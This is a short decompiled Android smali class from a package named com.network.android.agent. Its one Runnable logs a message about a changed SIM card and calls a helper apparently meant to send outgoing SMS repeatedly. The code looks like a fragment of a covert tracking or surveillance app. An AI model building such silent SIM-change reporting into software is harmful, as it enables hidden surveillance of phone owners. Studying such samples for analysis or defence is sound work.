.class final Lcom/network/android/agent/f;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/network/android/agent/NetworkApp;


# direct methods
.method constructor <init>(Lcom/network/android/agent/NetworkApp;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/agent/f;->b:Lcom/network/android/agent/NetworkApp;

    iput-object p2, p0, Lcom/network/android/agent/f;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    const/4 v3, 0x1

    const/4 v0, 0x6

    invoke-static {v3, v0}, Lcom/network/android/c/a/b;->a(IS)V

    const-string v0, "BootReceiver Sim was chaged call sendSmsMORepetitive"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/agent/f;->a:Landroid/content/Context;

    const/4 v1, 0x0

    const/16 v2, 0x3e8

    invoke-static {v0, v3, v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;III)V

    return-void
.end method
